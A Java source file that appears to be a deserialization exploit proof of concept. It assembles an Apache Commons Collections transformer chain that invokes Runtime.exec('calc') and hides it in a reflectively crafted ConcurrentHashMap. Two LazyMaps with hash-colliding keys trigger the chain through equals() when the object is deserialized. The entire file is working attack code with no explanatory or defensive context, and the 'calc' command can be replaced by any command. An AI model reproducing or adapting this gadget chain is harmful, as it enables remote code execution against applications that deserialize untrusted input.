package cc;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

public class ConcurrentHashMap_equals {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map lazymap1 = LazyMap.decorate(new HashMap(), new ConstantTransformer(1));
        lazymap1.put("yy", 1);
        Map lazymap2 = LazyMap.decorate(new HashMap(), new ConstantTransformer(1));
        lazymap2.put("zZ",1);

        ConcurrentHashMap concurrentHashMap = new ConcurrentHashMap();
        SerializableTest.setFieldValue(concurrentHashMap, "sizeCtl", 2);
        Class nodeC = Class.forName("java.util.concurrent.ConcurrentHashMap$Node");

        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, lazymap1, "yy", null));
        Array.set(tbl, 1, nodeCons.newInstance(0, lazymap2, "zZ", null));
        SerializableTest.setFieldValue(concurrentHashMap, "table", tbl);


        SerializableTest.setFieldValue(lazymap2, "factory", transformerChain);
//        SerializableTest.searilze(concurrentHashMap,"ConcurrentHashMap_equals.bin");
        SerializableTest.unzearilze("ConcurrentHashMap_equals.bin");
    }
}
